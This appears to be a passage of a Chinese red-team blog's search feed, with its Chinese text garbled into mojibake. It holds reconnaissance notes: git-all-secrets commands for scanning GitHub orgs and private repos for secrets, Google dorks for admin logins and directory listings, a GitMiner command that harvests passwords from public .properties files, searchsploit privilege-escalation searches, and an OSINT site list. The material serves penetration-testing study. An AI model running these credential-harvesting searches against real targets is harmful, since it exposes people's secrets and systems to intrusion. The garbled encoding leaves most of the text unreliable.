çŸ¥é“ç§å¯†gistçš„httpsURLï¼Œä»–ä¹Ÿèƒ½å¤Ÿè®¿é—®</li><li>-output= è¾“å‡ºç»“æœæ–‡ä»¶ï¼Œé»˜è®¤æ˜¯result.txt</li><li>-cloneForks= è¿™æ˜¯ä¸€ä¸ªå¸ƒå°”æ ‡å¿—ã€‚é»˜è®¤è®¾ç½®ä¸º0ï¼Œä¸å…‹éš†forksï¼Œå¦‚æœè®¾ç½®ä¸º1ï¼Œä»–å°±ä¼šå…‹éš†forks</li><li>-orgOnly= è¿™ä¹Ÿæ˜¯ä¸€ä¸ªå¸ƒå°”æ ‡å¿—ã€‚é»˜è®¤è®¾ç½®ä¸º0ã€‚å¦‚æœåªæ‰«æç»„ç»‡ä»“åº“è€Œä¸æ‰«æç”¨æˆ·çš„ä»“åº“ï¼Œè¯·å°†å®ƒè®¾ç½®ä¸º1</li><li>-toolName= è¿™æ˜¯è§„èŒƒæ‰«æå·¥å…·çš„æ ‡å¿—ã€‚é»˜è®¤ä»–ä½¿ç”¨allï¼Œthogå’Œrepo-supervisor</li><li>-scanPrivateReposOnly= è¿™æ˜¯è§„èŒƒæ˜¯å¦æ‰«æç”¨æˆ·ç§æœ‰ä»“åº“çš„æ ‡å¿—ã€‚ä»–åªèƒ½å·¥ä½œåœ¨userã€repoURLã€orgæ ‡å¿—</li><li>-enterpriseURL= ä¼ä¸šGithubURLçš„æ ‡å¿—ï¼Œå¦‚æœä½ å¸Œæœ›æ‰«æä¼ä¸šä»“åº“ï¼Œå°±é€‰è¿™ä¸ª</li><li>-threads= é»˜è®¤çº¿ç¨‹10</li><li>-thogEntropy= å¼€å¯é«˜ç†µæå–ï¼Œé»˜è®¤æ˜¯falseã€‚è®¾ç½®ä¸ºtrueä¼šæœ‰å¤§é‡çš„åƒåœ¾ä¿¡æ¯ï¼Œåœ¨æ¯”è¾ƒå¤§çš„ç›®æ ‡ä¸Šï¼Œä¸å»ºè®®å¼€å¯ã€‚å¦‚æœè®¾ç½®ä¸ºfalseï¼Œåˆ™æ„å‘³ç€truffleHogåªä¼šæå–åŸºäºrules.jsonæ–‡ä»¶ä¸­çš„æ­£åˆ™ç»“æœ</li><li>-blacklist= ä¸éœ€è¦æ‰«æçš„ä»“åº“åç§°ï¼Œä»¥é€—å·åˆ†å‰²</li></ul><h4 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h4><ul><li><p>Tokené€‰é¡¹ä¸èƒ½ä¸ºç©º</p></li><li><p>Org user repoURL gistURL ä¸èƒ½éƒ½è®¾ç½®ä¸ºç©ºï¼Œè‡³å°‘éœ€è¦æä¾›ä¸€ä¸ªé€‰é¡¹ã€‚å¦‚æœä½ æä¾›äº†å¤šä¸ªé€‰é¡¹ï¼Œä»–çš„é¡ºåºæ˜¯org&gt;user&gt;repoURL&gt;gistURLã€‚å¦‚æœä½ åªéœ€è¦è¿è¡Œåœ¨ç‰¹å®šç”¨æˆ·ä¸Šï¼Œé‚£å°±ä¸éœ€è¦æä¾›orgé€‰é¡¹</p></li><li><p>å½“å®šä¹‰scanPrivateReposOnlyæ ‡å¿—æ—¶ï¼š</p><p>â€‹    1.å¿…é¡»å°†åŒ…å«çš„SSH-keyçš„å·è½½å…¥åˆ°Dockerå®¹å™¨ä¸­ï¼Œä½¿ç”¨ -v é€‰é¡¹</p><p>â€‹    2.ä»–åº”è¯¥åœ¨æ‰«æç§æœ‰ä»“åº“æ—¶ä½¿ç”¨ï¼Œä½¿ç”¨SSH urlï¼Œè€Œä¸æ˜¯https url</p><p>â€‹    3.ç¡®ä¿ä½¿ç”¨äº†ç§æœ‰ä»“åº“/gistçš„ç”¨æˆ·tokenï¼Œå¦åˆ™ä¼šæŠ¥é”™</p><p>â€‹    4.å¦‚æœä½ æƒ³åœ¨æ²¡æœ‰æ‰‹åŠ¨å¹²æ‰°çš„æƒ…å†µä¸‹è¿è¡Œï¼Œè¯·ä¸è¦è®¾ç½®SSH keyçš„å¯†é’¥å¯†ç </p></li><li><p>å½“å®šä¹‰teamNameæ ‡å¿—çš„æ—¶å€™ï¼Œæä¾›ä¸€ä¸ªå›¢é˜Ÿæˆ å‘˜çš„tokenéå¸¸é‡è¦ï¼Œå¦åˆ™å¯èƒ½ä¼šå‡ºç°æ„å¤–ç»“æœ</p></li><li><p>å½“å®šä¹‰enterpriseURLæ ‡å¿—çš„æ—¶å€™ï¼Œå³ä½¿ä½ æä¾›äº†http URLï¼Œä»–ä¹Ÿå§‹ç»ˆä¼šè€ƒè™‘ssh keyã€‚æ‰€æœ‰ä¼ä¸šå…‹éš†/æ‰«æéƒ½æ˜¯é€šè¿‡ssh urlï¼Œè€Œä¸æ˜¯https url</p></li></ul><p>ç»¼ä¸Šï¼Œè¯·ç¡®ä¿ä½¿ç”¨äº†SSH keyï¼Œå¹¶ä¸”æ²¡æœ‰è®¾ç½®å¯†é’¥å¯†ç </p><h2 id="æ‰«æ"><a href="#æ‰«æ" class="headerlink" title="æ‰«æ"></a>æ‰«æ</h2><h3 id="æ‰«æç§æœ‰ä»“åº“"><a href="#æ‰«æç§æœ‰ä»“åº“" class="headerlink" title="æ‰«æç§æœ‰ä»“åº“"></a>æ‰«æç§æœ‰ä»“åº“</h3><p>æ‰«æç§æœ‰ä»“åº“æœ€ç¨³å¦¥çš„æ–¹æ³•æ˜¯ä½¿ç”¨SSH URLå…‹éš†ã€‚å®ç°è¿™ä¸ªä½ éœ€è¦å°†SSH keyæ·»åŠ åˆ°Githubç”¨æˆ·ã€‚</p><p>ç”¨æˆ·é…ç½®å‚è€ƒï¼š<a href="https://help.github.com/en/articles/adding-a-new-ssh-key-to-your-github-account">https://help.github.com/en/articles/adding-a-new-ssh-key-to-your-github-account</a></p><p>ç¡®ä¿è¿™ä¸ªkeyæ²¡æœ‰å¯†ç è®¾ç½®ã€‚æœ‰äº†SSH keyä»¥åï¼Œå°†å®ƒæŒ‚è½½åˆ°Dockerå®¹å™¨ä¸­ï¼Œè¿è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p><p><code>docker run -it -v ~/.ssh/id_rsa_personal:/root/.ssh/id_rsa abhartiya/tools_gitallsecrets -token=&lt;&gt; -user=&lt;&gt; -scanPrivateReposOnly</code></p><p>OR</p><p><code>docker run -it -v ~/.ssh/id_rsa_personal:/root/.ssh/id_rsa abhartiya/tools_gitallsecrets -token=&lt;&gt; -repoURL=&lt;&gt; -scanPrivateReposOnly</code></p><p>å°†æœ¬åœ°çš„personal SSH-keyå­˜å‚¨åˆ°Dockerå†…éƒ¨å®¹å™¨ /root/.ssh/id_rsaï¼Œgit-all-secretsä¼šè¯•å›¾é€šè¿‡å­˜å‚¨åœ¨ /root/.ssh/id_rsa çš„ssh keyæ¥å…‹éš†ä»“åº“</p><h3 id="æ‰«æç»„ç»‡å›¢é˜Ÿ"><a href="#æ‰«æç»„ç»‡å›¢é˜Ÿ" class="headerlink" title="æ‰«æç»„ç»‡å›¢é˜Ÿ"></a>æ‰«æç»„ç»‡å›¢é˜Ÿ</h3><p>Github APIé™åˆ¶äº†ç§æœ‰ä»“åº“ç¯å¢ƒã€‚å°è¯•ä½¿ç”¨éç®¡ç†å‘˜ç”¨æˆ·æ‰«æç»„ç»‡ï¼Œéœ€è¦ç»™ç”¨æˆ·æ·»åŠ ä»“åº“çš„è®¿é—®æƒé™ã€‚å¦‚æœéè¦æ‰«æç»„ç»‡å›¢é˜Ÿï¼Œå¯ä»¥è¿è¡Œï¼š</p><p>docker run â€“it -v ~/.ssh/id_rsa_personal:/root/.ssh/id_rsa abhartiya/tools_gitallsecrets -token=&lt;&gt; -org=&lt;&gt; -teamName &lt;&gt;</p><h3 id="æ‰«æä¼ä¸šGithub"><a href="#æ‰«æä¼ä¸šGithub" class="headerlink" title="æ‰«æä¼ä¸šGithub"></a>æ‰«æä¼ä¸šGithub</h3><p>git-all-secretsæ”¯æŒæ‰«æä¼ä¸šä»“åº“ï¼Œä½¿ç”¨enterpriseURLé€‰é¡¹ï¼š</p><h4 id="å®ä¾‹1"><a href="#å®ä¾‹1" class="headerlink" title="å®ä¾‹1"></a>å®ä¾‹1</h4><p>docker run -it -v ~/.ssh/id_rsa_gitenterprise:/root/.ssh/id_rsa -token <token> -enterpriseURL <a href="https://github/">https://github</a>.<org>.com/api/v3 -repoURL <a href="https://github/">https://github</a>.<org>.com/<user>/<repo>.git</p><h4 id="å®ä¾‹2"><a href="#å®ä¾‹2" class="headerlink" title="å®ä¾‹2"></a>å®ä¾‹2</h4><p>docker run -it -v ~/.ssh/id_rsa_gitenterprise:/root/.ssh/id_rsa -token <token> -enterpriseURL <a href="https://github/">https://github</a>.<org>.com/api/v3 -repoURL <a href="https://github/">https://github</a>.<org>.com/<user>/<repo>.git -toolName thog -thogEntropy</p><h4 id="å®ä¾‹3"><a href="#å®ä¾‹3" class="headerlink" title="å®ä¾‹3"></a>å®ä¾‹3</h4><p>docker run -it -v ~/.ssh/id_rsa_gitenterprise:/root/.ssh/id_rsa -token <token> -enterpriseURL <a href="https://github/">https://github</a>.<org>.com/api/v3 -user <username> -scanPrivateReposOnly</p><h2 id="ç‰¹æ€§"><a href="#ç‰¹æ€§" class="headerlink" title="ç‰¹æ€§"></a>ç‰¹æ€§</h2><p>å¯ä»¥æ·»åŠ è‡ªå·±çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œåœ¨docker runçš„æ—¶å€™ä½¿ç”¨-v $(pwd)/rules.json:/root/truffleHog/rules.jsonã€‚å¯ä»¥ä½¿ç”¨é»˜è®¤æ­£åˆ™è¡¨è¾¾å¼ï¼Œå¦‚æœéœ€è¦ï¼Œä¹Ÿå¯ä»¥ç”¨truffleHogæä¾›çš„é«˜ç†µå­—ç¬¦ä¸²ã€‚å¯ä»¥é€šè¿‡repo-supervisorå·¥å…·æœç´¢.jså’Œ.jsonä¸­çš„é«˜ç†µå­—ç¬¦ä¸²ã€‚å¯ä»¥æœç´¢ç”¨æˆ·çš„Gistï¼Œå¤§å¤šæ•°å·¥å…·éƒ½æ²¡è¿™ä¸ªåŠŸèƒ½ã€‚æœ‰æ–°å·¥å…·å¯ä»¥å¾ˆå®¹æ˜“åœ°é›†æˆåˆ°git-all-secretsã€‚æ”¯æŒæ‰«æä¼ä¸šGithub orgs/uesrs/repos/gistsã€‚å¤§å¤šæ•°å·¥å…·åªæ‰«æå•ä¸ªä»“åº“ï¼Œgit-all-secretså¯ä»¥ä¸€æ¬¡æ‰«æå¤šä¸ªã€‚</p>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> ä¿¡æ¯æ”¶é›† </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google Hacking</title>
      <link href="/2022/03/26/google-hacking/"/>
      <url>/2022/03/26/google-hacking/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç« èŠ‚å†…å®¹ä¸»è¦æ˜¯ä»‹ç»Googleä¸­çš„æœç´¢è¯­æ³•ï¼Œåˆ©ç”¨googleè¯­æ³•å»ç²¾å‡†å®šä½ä¸€äº›é¡µé¢ã€‚</p><p>æ–‡ç« å†…å®¹ä¸»è¦æ‘˜è‡ªæŸçº¢é˜Ÿç³»åˆ—ä¸›ä¹¦ï¼Œå°†å¸‚é¢ä¸Šç°åœ¨æµä¼ çš„ redteam ç³»åˆ—ä¹¦ç±è¿›è¡Œä¸€ä¸ªå­¦ä¹ è®°å½•ã€‚</p><h2 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h2><h3 id="é€šé…ç¬¦"><a href="#é€šé…ç¬¦" class="headerlink" title="é€šé…ç¬¦"></a>é€šé…ç¬¦</h3><table><thead><tr><th>é€šé…ç¬¦</th><th>è¯­ä¹‰</th><th>è¯´æ˜</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>+</td><td>åŒ…å«å…³é”®è¯</td><td>+å‰é¢å¿…é¡»è¦æœ‰ä¸€ä¸ªç©ºæ ¼</td><td>admin +login</td></tr><tr><td>-</td><td>æ’é™¤å…³é”®è¯</td><td>-å‰é¢å¿…é¡»è¦æœ‰ä¸€ä¸ªç©ºæ ¼</td><td>mysql -csdn</td></tr><tr><td>~</td><td>åŒä¹‰è¯</td><td>~å‰é¢å¿…é¡»è¦æœ‰ä¸€ä¸ªç©ºæ ¼</td><td>mysql ~csdn</td></tr><tr><td>*</td><td>æ¨¡ç³ŠæŸ¥è¯¢</td><td>*ä»£æ›¿ä»»æ„å­—ç¬¦</td><td>mysql**</td></tr><tr><td>â€œâ€</td><td>å¼ºè°ƒ</td><td>-</td><td>â€œmysqlâ€</td></tr></tbody></table><h3 id="é«˜çº§è¯­æ³•"><a href="#é«˜çº§è¯­æ³•" class="headerlink" title="é«˜çº§è¯­æ³•"></a>é«˜çº§è¯­æ³•</h3><p>è¯­æ³•ï¼šè¯­å¥:å…³é”®è¯</p><table><thead><tr><th>è¯­æ³•</th><th>è¯­ä¹‰</th></tr></thead><tbody><tr><td>intitle</td><td>åŒ…å«æ ‡é¢˜</td></tr><tr><td>intext</td><td>åŒ…å«å†…å®¹</td></tr><tr><td>filetyepe</td><td>æ–‡ä»¶ç±»å‹</td></tr><tr><td>info</td><td>åŸºæœ¬ä¿¡æ¯</td></tr><tr><td>site</td><td>æŒ‡å®šç½‘ç«™</td></tr><tr><td>inurl</td><td>åŒ…å«æŸä¸ªurl</td></tr><tr><td>link</td><td>åŒ…å«æŒ‡å®šé“¾æ¥çš„ç½‘é¡µ</td></tr><tr><td>cache</td><td>æ˜¾ç¤ºé¡µé¢çš„ç¼“å­˜ç‰ˆæœ¬</td></tr><tr><td>numberange</td><td>æœç´¢ä¸€ä¸ªæ•°å­—</td></tr></tbody></table><h4 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h4><p><img src="https://imgtp.apqiang.com/2022/03/26/0ZuyuNYp.png"></p><ul><li>æœç´¢ç›®æ ‡åŒ…å«åå°çš„é¡µé¢</li></ul><p><code>site:&quot;some-keywords.com&quot; intitle:login intext: ç®¡ç†|åå°|ç™»å½•|ç”¨æˆ·å|å¯†ç |éªŒè¯ç |ç³»ç»Ÿ|è´¦å·|manage|admin|login|system</code></p><ul><li>æœç´¢ç›®æ ‡æ˜¯å¦æœ‰åˆ—ç›®å½•</li></ul><p><code>site:&quot;some-keywords.com&quot; intext: index of / | ../ | Parent Directory</code></p>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> ä¿¡æ¯æ”¶é›† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github Hacking</title>
      <link href="/2022/03/26/github-hacking/"/>
      <url>/2022/03/26/github-hacking/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç« èŠ‚å†…å®¹ä¸»è¦æ˜¯ä»‹ç»Githubä¸­çš„æœç´¢è¯­æ³•ï¼ŒæŸ¥è¯¢é¡¹ç›®å…¬å¼€çš„æºç ã€‚</p><p>æ–‡ç« å†…å®¹ä¸»è¦æ‘˜è‡ªæŸçº¢é˜Ÿç³»åˆ—ä¸›ä¹¦ï¼Œå°†å¸‚é¢ä¸Šç°åœ¨æµä¼ çš„ redteam ç³»åˆ—ä¹¦ç±è¿›è¡Œä¸€ä¸ªå­¦ä¹ è®°å½•ã€‚</p><h2 id="Github-Hacking"><a href="#Github-Hacking" class="headerlink" title="Github Hacking"></a>Github Hacking</h2><p>æ‚¨å¯ä»¥åœ¨æ‰€æœ‰å…¬å…±GitHubå­˜å‚¨åº“ä¸­æœç´¢ä»¥ä¸‹ç±»å‹çš„ä¿¡æ¯ï¼Œä»¥åŠæ‚¨æœ‰æƒè®¿é—®çš„æ‰€æœ‰ç§æœ‰GitHubå­˜å‚¨åº“ï¼š</p><h3 id="å…³é”®å­—"><a href="#å…³é”®å­—" class="headerlink" title="å…³é”®å­—"></a>å…³é”®å­—</h3><ul><li>Repositories</li><li>Topics</li><li>Issues and pull requests</li><li>Code</li><li>Commits</li><li>Users</li><li>Wikis</li></ul><p>å‚è€ƒï¼š</p><ul><li>Searching for repositories</li><li>Searching topics</li><li>Searching code</li><li>Searching commits</li><li>Searching issues and pull requests</li><li>Searching users</li><li>Searching wikis</li><li>Searching in forks</li></ul><p>æ‚¨å¯ä»¥ä½¿ç”¨ <em>æœç´¢</em> é¡µé¢æˆ– <em>é«˜çº§æœç´¢</em> é¡µé¢æœç´¢GitHubã€‚</p><p>æ‚¨å¯ä»¥ä½¿ç”¨ &gt; , &gt;= , &lt; , å’Œ &lt;= æœç´¢æ˜¯å¤§äºï¼Œå¤§äºæˆ–ç­‰äºï¼Œå°äºå’Œå°äºæˆ–ç­‰äºå¦ä¸€ä¸ªå€¼çš„å€¼ã€‚</p><h3 id="æœç´¢ä»“åº“"><a href="#æœç´¢ä»“åº“" class="headerlink" title="æœç´¢ä»“åº“"></a>æœç´¢ä»“åº“</h3><table><thead><tr><th>Query</th><th>Example</th></tr></thead><tbody><tr><td>&gt;_n_</td><td>cats stars:&gt;1000 åŒ¹é…å…³é”®å­—â€catsâ€ä¸”starå¤§äº1000çš„ä»“åº“</td></tr><tr><td>&gt;=_n_</td><td>cats topics:&gt;=5 åŒ¹é…å…³é”®å­—â€catsâ€ä¸”æ ‡ç­¾æ•°é‡å¤§äºç­‰äº5çš„ä»“åº“</td></tr><tr><td>&lt;_n_</td><td>cats size:&lt;10000 åŒ¹é…å…³é”®å­—â€catsâ€ä¸”æ–‡ä»¶å°äº10KBçš„ä»“åº“</td></tr><tr><td>&lt;=_n_</td><td>cats stars:&lt;=50 åŒ¹é…å…³é”®å­—â€catsâ€ä¸”starå°äºç­‰äº50çš„ä»“åº“</td></tr><tr><td>_n_..*</td><td>cats stars:10..* åŒ¹é…å…³é”®å­—â€catsâ€ä¸”starå¤§äº10çš„ä»“åº“</td></tr><tr><td>*.._n_</td><td>cats stars:*..10 åŒ¹é…å…³é”®å­—â€catsâ€ä¸”starå°äºç­‰äº10çš„ä»“åº“</td></tr><tr><td>n..n</td><td>cats stars:10..50 åŒ¹é…å…³é”®å­—â€catsâ€ä¸”starå¤§äº10ä¸”å°äº50çš„ä»“åº“</td></tr><tr><td>_n_..*</td><td>cats stars:10..* åŒ¹é…å…³é”®å­—â€catsâ€ä¸”starå¤§äºç­‰äº10çš„ä»“åº“</td></tr><tr><td>*.._n_</td><td>cats stars:*..10 åŒ¹é…å…³é”®å­—â€catsâ€ä¸”starå°äºç­‰äº10çš„ä»“åº“</td></tr><tr><td>n..n</td><td>cats stars:10..50 åŒ¹é…å…³é”®å­—â€catsâ€ä¸”starå¤§äº10ä¸”å°äº50çš„ä»“åº“</td></tr></tbody></table><h3 id="æœç´¢ä»£ç "><a href="#æœç´¢ä»£ç " class="headerlink" title="æœç´¢ä»£ç "></a>æœç´¢ä»£ç </h3><h4 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h4><ul><li>åªèƒ½æœç´¢å°äº384 KBçš„æ–‡ä»¶</li><li>åªèƒ½æœç´¢å°äº500,000ä¸ªæ–‡ä»¶çš„å­˜å‚¨åº“</li><li>ç™»å½•çš„ç”¨æˆ·å¯ä»¥æœç´¢æ‰€æœ‰å…¬å…±å­˜å‚¨åº“</li><li>é™¤ filename æœç´¢å¤–ï¼Œæœç´¢æºä»£ç æ—¶å¿…é¡»è‡³å°‘åŒ…å«ä¸€ä¸ªæœç´¢è¯ã€‚ä¾‹å¦‚ï¼Œæœç´¢ language:javascript æ— æ•ˆï¼Œè€Œæ˜¯è¿™æ ·ï¼š amazing language:javascriptã€‚</li><li>æœç´¢ç»“æœæœ€å¤šå¯ä»¥æ˜¾ç¤ºæ¥è‡ªåŒä¸€ä¸ªæ–‡ä»¶çš„ä¸¤ä¸ªç‰‡æ®µï¼Œä½†æ–‡ä»¶ä¸­å¯èƒ½ä¼šæœ‰æ›´å¤šç»“æœã€‚</li><li>æ‚¨ä¸èƒ½å°†ä»¥ä¸‹é€šé…ç¬¦ç”¨ä½œæœç´¢æŸ¥è¯¢çš„ä¸€éƒ¨åˆ†ï¼š. , : ; / \ â€˜ â€œ = * ! ? # $ &amp; + ^ | ~ &lt; &gt; ( ) { } [ ]ã€‚æœç´¢å°†å¿½ç•¥è¿™äº›ç¬¦å·ã€‚</li></ul><h4 id="æ—¥æœŸæ¡ä»¶"><a href="#æ—¥æœŸæ¡ä»¶" class="headerlink" title="æ—¥æœŸæ¡ä»¶"></a>æ—¥æœŸæ¡ä»¶</h4><p>cats pushed:&lt;2012-07-05 æœç´¢åœ¨2012å¹´07æœˆ05æ—¥å‰pushä»£ç ï¼Œä¸”catsä½œä¸ºå…³é”®å­—</p><p>cats pushed:2016-04-30..2016-07-04 æ—¥æœŸåŒºé—´</p><p>cats created:&gt;=2017-04-01 åˆ›å»ºæ—¶é—´</p><h4 id="é€»è¾‘è¿ç®—"><a href="#é€»è¾‘è¿ç®—" class="headerlink" title="é€»è¾‘è¿ç®—"></a>é€»è¾‘è¿ç®—</h4><p>ANDã€ORã€NOT</p><h4 id="æ’é™¤è¿ç®—"><a href="#æ’é™¤è¿ç®—" class="headerlink" title="æ’é™¤è¿ç®—"></a>æ’é™¤è¿ç®—</h4><p>cats pushed:&lt;2012-07-05 -language:java æœç´¢åœ¨2012å¹´07æœˆ05æ—¥å‰pushä»£ç ï¼Œä¸”catsä½œä¸ºå…³é”®å­—ï¼Œæ’é™¤ java è¯­è¨€ä»“åº“ã€‚</p><h4 id="åŒ…å«æœç´¢"><a href="#åŒ…å«æœç´¢" class="headerlink" title="åŒ…å«æœç´¢"></a>åŒ…å«æœç´¢</h4><p>cats in:file æœç´¢æ–‡ä»¶ä¸­åŒ…å«catsçš„ä»£ç </p><p>cats in:path æœç´¢è·¯å¾„ä¸­åŒ…å«catsçš„ä»£ç </p><p>cats in:path,file æœç´¢è·¯åŠ²ã€æ–‡ä»¶ä¸­åŒ…å«catsçš„ä»£ç </p><p>console path:app/public language:javascript æœç´¢å…³é”®å­—consoleï¼Œä¸”è¯­è¨€ä¸ºjavascriptï¼Œåœ¨app/publicä¸‹çš„ä»£ç </p><h4 id="ä¸»é¢˜æœç´¢"><a href="#ä¸»é¢˜æœç´¢" class="headerlink" title="ä¸»é¢˜æœç´¢"></a>ä¸»é¢˜æœç´¢</h4><p>user:USERNAME ç”¨æˆ·åæœç´¢</p><p>org:ORGNAME ç»„ç»‡æœç´¢</p><p>repo:USERNAME/REPOSITORY æŒ‡å®šä»“åº“æœç´¢</p><h4 id="æ–‡ä»¶å¤§å°"><a href="#æ–‡ä»¶å¤§å°" class="headerlink" title="æ–‡ä»¶å¤§å°"></a>æ–‡ä»¶å¤§å°</h4><p>size:&gt;1000 æœç´¢å¤§å°å¤§äº1KBçš„æ–‡ä»¶</p><h4 id="æ–‡ä»¶åç§°"><a href="#æ–‡ä»¶åç§°" class="headerlink" title="æ–‡ä»¶åç§°"></a>æ–‡ä»¶åç§°</h4><p>filename:config.php language:php æœç´¢æ–‡ä»¶åä¸ºconfig.phpï¼Œä¸”è¯­è¨€ä¸ºphpçš„ä»£ç ã€‚ä¾‹å¦‚æœç´¢Javaé¡¹ç›®é…ç½®æ–‡ä»¶ï¼šmail filename:.properties</p><p><img src="https://img1.imgtp.com/2022/03/26/Du5ZaVml.png"></p><h4 id="æ‰©å±•å"><a href="#æ‰©å±•å" class="headerlink" title="æ‰©å±•å"></a>æ‰©å±•å</h4><p>extension:EXTENSION æŒ‡å®šæ‰©å±•åæœç´¢</p><p>ä¾‹å¦‚ï¼šextension:properties jdbc</p><h2 id="è‡ªåŠ¨åŒ–å·¥å…·"><a href="#è‡ªåŠ¨åŒ–å·¥å…·" class="headerlink" title="è‡ªåŠ¨åŒ–å·¥å…·"></a>è‡ªåŠ¨åŒ–å·¥å…·</h2><p><a href="https://github.com/UnkL4b/GitMiner">https://github.com/UnkL4b/GitMiner</a></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python3 gitminer-v2.0.py -c cookie.txt  -q &#39;extension:properties jdbc&#39; -r &#39;password(.*)&#39; -m passwords<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>éœ€è¦å°†cookieä¿¡æ¯å­˜å…¥æ–‡ä»¶ä¸­</p>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> ä¿¡æ¯æ”¶é›† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¼€æ”¾æ¼æ´æƒ…æŠ¥&amp;å¼€æºæƒ…æŠ¥ä¿¡æ¯æ”¶é›†ï¼ˆOSINTï¼‰</title>
      <link href="/2022/03/25/kai-yuan-lou-dong-qing-bao/"/>
      <url>/2022/03/25/kai-yuan-lou-dong-qing-bao/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç« èŠ‚å†…å®¹ä¸»è¦æ˜¯ä»‹ç»å¸¸è§çš„æ¼æ´ä¿¡æ¯æ”¶é›†å’Œå¸¸è§çš„æƒ…æŠ¥ä¿¡æ¯æ”¶é›†ã€‚</p><p>æ–‡ç« å†…å®¹ä¸»è¦æ‘˜è‡ªæŸçº¢é˜Ÿç³»åˆ—ä¸›ä¹¦ï¼Œå°†å¸‚é¢ä¸Šç°åœ¨æµä¼ çš„ redteam ç³»åˆ—ä¹¦ç±è¿›è¡Œä¸€ä¸ªå­¦ä¹ è®°å½•ã€‚</p><h2 id="å¼€å‘æ¼æ´æƒ…æŠ¥"><a href="#å¼€å‘æ¼æ´æƒ…æŠ¥" class="headerlink" title="å¼€å‘æ¼æ´æƒ…æŠ¥"></a>å¼€å‘æ¼æ´æƒ…æŠ¥</h2><h3 id="å¸¸ç”¨ç½‘ç«™"><a href="#å¸¸ç”¨ç½‘ç«™" class="headerlink" title="å¸¸ç”¨ç½‘ç«™"></a>å¸¸ç”¨ç½‘ç«™</h3><ul><li>CVE <a href="https://cve.mitre.org/">https://cve.mitre.org</a></li><li>Exploit-DB <a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></li><li>CX Security <a href="https://cxsecurity.com/">https://cxsecurity.com/</a></li><li>CNVD <a href="https://www.cnvd.org.cn/">https://www.cnvd.org.cn/</a></li><li>securitytracker ï¼ˆç½‘ç«™ç°å·²å…³é—­ï¼‰</li></ul><h3 id="Search-Exploit-DB"><a href="#Search-Exploit-DB" class="headerlink" title="Search Exploit-DB"></a>Search Exploit-DB</h3><p><img src="https://img1.imgtp.com/2022/03/25/dJp5wuQ4.png"></p><h4 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h4><p>æœç´¢Windowsææƒæ¼æ´</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">searchsploit -t windows <span class="token builtin class-name">local</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img1.imgtp.com/2022/03/25/Sd0TTUUZ.png"></p><p>æœç´¢Apacheæ¼æ´</p><p><img src="https://img1.imgtp.com/2022/03/25/Gu6eUnjF.png"></p><h2 id="å¼€æºæƒ…æŠ¥ä¿¡æ¯æœé›†ï¼ˆOSINTï¼‰"><a href="#å¼€æºæƒ…æŠ¥ä¿¡æ¯æœé›†ï¼ˆOSINTï¼‰" class="headerlink" title="å¼€æºæƒ…æŠ¥ä¿¡æ¯æœé›†ï¼ˆOSINTï¼‰"></a>å¼€æºæƒ…æŠ¥ä¿¡æ¯æœé›†ï¼ˆOSINTï¼‰</h2><h3 id="æœç´¢å¼•æ“è¯­æ³•"><a href="#æœç´¢å¼•æ“è¯­æ³•" class="headerlink" title="æœç´¢å¼•æ“è¯­æ³•"></a>æœç´¢å¼•æ“è¯­æ³•</h3><ul><li>ç™¾åº¦ <a href="http://www.baidu.com/">http://www.baidu.com</a></li><li>è°·æ­Œ <a href="http://www.google.com/">http://www.google.com</a></li><li>å¿…åº” <a href="http://www.bing.com/">http://www.bing.com</a></li></ul><h3 id="åœ¨çº¿æ¥å£"><a href="#åœ¨çº¿æ¥å£" class="headerlink" title="åœ¨çº¿æ¥å£"></a>åœ¨çº¿æ¥å£</h3><table><thead><tr><th>url</th><th>ç®€ä»‹</th></tr></thead><tbody><tr><td><a href="https://www.webscan.cc/">https://www.webscan.cc/</a></td><td>ä¸»è¦è§£æåŸŸåipï¼ŒåŒæ—¶æä¾›è¯¥åŒæœipç«™ç‚¹åˆ—è¡¨ï¼Œä½†å¤šæ•°è§£æä¸ºcdn</td></tr><tr><td><a href="https://search.censys.io/">https://search.censys.io/</a></td><td>æ ¹æ®ipæŸ¥è¯¢å¼€å¯çš„æœåŠ¡ä¿¡æ¯ï¼ŒæŸ¥çœ‹å­åŸŸå…³ç³»å›¾ã€‚ä¹Ÿå¯ä»¥æ ¹æ®bodyä¿¡æ¯æŸ¥è¯¢å«æœ‰å…³é”®å­—çš„ä¸»æœº</td></tr><tr><td><a href="https://crt.sh/">https://crt.sh/</a></td><td>å¯ä»¥æŸ¥è¯¢åŸŸçš„OUä¿¡æ¯å’Œè¯ä¹¦ä¿¡æ¯</td></tr><tr><td><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></td><td>åŠ 